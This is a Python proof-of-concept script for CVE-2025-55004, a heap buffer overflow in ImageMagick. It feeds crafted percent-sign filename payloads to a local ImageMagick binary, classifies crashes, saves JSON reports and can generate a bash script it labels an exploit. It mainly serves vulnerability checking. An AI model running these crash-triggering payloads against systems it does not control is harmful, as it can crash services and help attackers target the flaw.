#!/usr/bin/env python3
"""
CVE-2025-55004 - ImageMagick Heap Buffer Overflow POC ..reducto..
"""

from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, asdict
from datetime import datetime
from pathlib import Path
from typing import Optional


@dataclass
class TestResult:
    """Stores individual test execution results."""
    payload: str
    crashed: bool
    return_code: int
    stderr: str
    execution_time: float
    crash_type: Optional[str] = None


class CVE202555004POC:
    """Streamlined POC for CVE-2025-55004 ImageMagick vulnerability."""

    CRASH_SIGNALS = {-11: "segfault", -6: "abort", 139: "segfault", 134: "abort"}
    CRASH_PATTERNS = {
        "heap_overflow": ["heap-buffer-overflow", "heap overflow"],
        "segfault": ["segmentation fault", "sigsegv"],
        "asan": ["addresssanitizer", "asan:", "==error:"],
        "memory_error": ["invalid read", "invalid write"],
    }

    def __init__(self, magick_path: Optional[str] = None, timeout: int = 10):
        self.magick_path = magick_path or self._find_magick()
        self.timeout = timeout
        self.results: list[TestResult] = []

    def _find_magick(self) -> str:
        """Locate ImageMagick binary."""
        candidates = ["magick", "convert"]
        
        for name in candidates:
            result = subprocess.run(
                ["which", name], capture_output=True, text=True
            )
            if result.returncode == 0:
                path = result.stdout.strip()
                if self._validate_binary(path):
                    return path

        common_paths = [
            "/usr/bin/magick",
            "/usr/local/bin/magick",
            "/usr/bin/convert",
        ]
        
        for path in common_paths:
            if Path(path).exists() and self._validate_binary(path):
                return path

        raise FileNotFoundError(
            "ImageMagick not found. Install or use --magick-path"
        )

    def _validate_binary(self, path: str) -> bool:
        """Verify binary is ImageMagick."""
        try:
            result = subprocess.run(
                [path, "-version"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            return (
                result.returncode == 0
                and "imagemagick" in result.stdout.lower()
            )
        except Exception:
            return False

    def get_version(self) -> str:
        """Extract ImageMagick version string."""
        try:
            result = subprocess.run(
                [self.magick_path, "-version"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            for line in result.stdout.split("\n"):
                if line.startswith("Version:"):
                    return line.split(":", 1)[1].strip()
        except Exception:
            pass
        return "unknown"

    def _classify_crash(self, stderr: str, code: int) -> Optional[str]:
        """Determine crash type from output and exit code."""
        if code in self.CRASH_SIGNALS:
            return self.CRASH_SIGNALS[code]

        stderr_lower = stderr.lower()
        for crash_type, patterns in self.CRASH_PATTERNS.items():
            if any(p in stderr_lower for p in patterns):
                return crash_type

        return "unknown" if code != 0 else None

    def _run_payload(self, payload: str) -> TestResult:
        """Execute single payload and return result."""
        start = time.perf_counter()

        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = tmp.name

        try:
            proc = subprocess.Popen(
                [self.magick_path, payload, tmp_path],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )

            try:
                _, stderr = proc.communicate(timeout=self.timeout)
                code = proc.returncode
            except subprocess.TimeoutExpired:
                proc.kill()
                _, stderr = proc.communicate()
                code = -999
                stderr = f"TIMEOUT after {self.timeout}s\n{stderr or ''}"

            elapsed = time.perf_counter() - start
            crash_type = self._classify_crash(stderr, code)
            crashed = crash_type is not None or code != 0

            return TestResult(
                payload=payload,
                crashed=crashed,
                return_code=code,
                stderr=stderr,
                execution_time=elapsed,
                crash_type=crash_type,
            )
        finally:
            try:
                os.unlink(tmp_path)
            except Exception:
                pass

    def generate_payloads(self, quick: bool = False) -> list[str]:
        """Generate test payloads."""
        basic = ["%%", "%%%", "%%%%", "%%%%%"]
        
        if quick:
            return basic

        extended = ["%%" * i for i in range(3, 10)]
        mixed = ["%%test", "test%%", "%%.png", "%%[width]"]
        edge = ["%%" + "A" * 100, "A" * 100 + "%%", "%" * 256]

        return basic + extended + mixed + edge

    def run_tests(self, quick: bool = False) -> dict:
        """Execute vulnerability tests."""
        payloads = self.generate_payloads(quick)
        version = self.get_version()

        print(f"Testing ImageMagick {version}")
        print(f"Running {len(payloads)} payloads...\n")

        self.results = []
        crashed = 0

        for i, payload in enumerate(payloads, 1):
            display = payload[:50] + "..." if len(payload) > 50 else payload
            print(f"[{i}/{len(payloads)}] Testing '{display}'... ", end="")

            result = self._run_payload(payload)
            self.results.append(result)

            if result.crashed:
                crashed += 1
                print(f"CRASH ({result.crash_type})")
            else:
                print("OK")

        vulnerable = crashed > 0
        
        return {
            "timestamp": datetime.now().isoformat(),
            "version": version,
            "total_tests": len(payloads),
            "crashes": crashed,
            "vulnerable": vulnerable,
            "crash_types": self._count_crash_types(),
        }

    def _count_crash_types(self) -> dict[str, int]:
        """Count occurrences of each crash type."""
        counts: dict[str, int] = {}
        for result in self.results:
            if result.crashed and result.crash_type:
                counts[result.crash_type] = counts.get(result.crash_type, 0) + 1
        return counts

    def save_report(self, filename: Optional[str] = None) -> str:
        """Save JSON report."""
        if not filename:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"cve-2025-55004_{ts}.json"

        report = {
            "cve": "CVE-2025-55004",
            "description": "ImageMagick Heap Buffer Overflow",
            "timestamp": datetime.now().isoformat(),
            "version": self.get_version(),
            "summary": self._count_crash_types(),
            "results": [
                {
                    "payload": r.payload,
                    "crashed": r.crashed,
                    "code": r.return_code,
                    "type": r.crash_type,
                    "time": round(r.execution_time, 3),
                }
                for r in self.results
            ],
        }

        with open(filename, "w") as f:
            json.dump(report, f, indent=2)

        print(f"\nReport saved: {filename}")
        return filename

    def create_exploit(self, filename: Optional[str] = None) -> str:
        """Generate exploit shell script."""
        if not filename:
            filename = "cve-2025-55004-exploit.sh"

        # Use top crash payloads or defaults
        crash_payloads = [
            r.payload for r in self.results if r.crashed
        ][:5]
        payloads = crash_payloads if crash_payloads else ["%%", "%%%", "%%%%"]

        script = f'''#!/bin/bash
# CVE-2025-55004 ImageMagick Exploit
# Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

set -e

MAGICK="{self.magick_path}"

echo "CVE-2025-55004 ImageMagick Heap Overflow Test"
echo "Target: $MAGICK"
echo ""

test_payload() {{
    local payload="$1"
    echo -n "Testing '$payload'... "
    
    if timeout 10 "$MAGICK" "$payload" /tmp/test_$$.png 2>/dev/null; then
        echo "OK"
        return 1
    else
        echo "CRASH (code $?)"
        return 0
    fi
}}

vulnerable=0
'''

        for payload in payloads:
            escaped = payload.replace("'", "'\"'\"'")
            script += f"test_payload '{escaped}' && vulnerable=1\n"

        script += '''
echo ""
if [ $vulnerable -eq 1 ]; then
    echo "VULNERABLE: CVE-2025-55004 confirmed"
    exit 1
else
    echo "No crashes detected"
    exit 0
fi
'''

        with open(filename, "w") as f:
            f.write(script)

        os.chmod(filename, 0o755)
        print(f"Exploit script created: {filename}")
        return filename


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-55004 ImageMagick Heap Overflow POC"
    )
    parser.add_argument("--magick-path", help="Path to ImageMagick binary")
    parser.add_argument(
        "--timeout", type=int, default=10, help="Test timeout (default: 10s)"
    )
    parser.add_argument(
        "--quick", action="store_true", help="Run only basic tests"
    )
    parser.add_argument("--save-report", metavar="FILE", help="Save JSON report")
    parser.add_argument(
        "--create-exploit", metavar="FILE", help="Generate exploit script"
    )
    parser.add_argument(
        "--version-only", action="store_true", help="Show version and exit"
    )

    args = parser.parse_args()

    try:
        poc = CVE202555004POC(args.magick_path, args.timeout)

        if args.version_only:
            print(poc.get_version())
            return

        if args.create_exploit:
            poc.create_exploit(args.create_exploit)
            return

        summary = poc.run_tests(quick=args.quick)

        print("\n" + "=" * 60)
        print("SUMMARY")
        print("=" * 60)
        print(f"Version: {summary['version']}")
        print(f"Tests: {summary['total_tests']}")
        print(f"Crashes: {summary['crashes']}")
        print(f"Vulnerable: {'YES' if summary['vulnerable'] else 'NO'}")
        
        if summary['crash_types']:
            print(f"Types: {', '.join(summary['crash_types'].keys())}")
        
        print("=" * 60)

        if args.save_report:
            poc.save_report(args.save_report)

        sys.exit(1 if summary["vulnerable"] else 0)

    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(130)
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
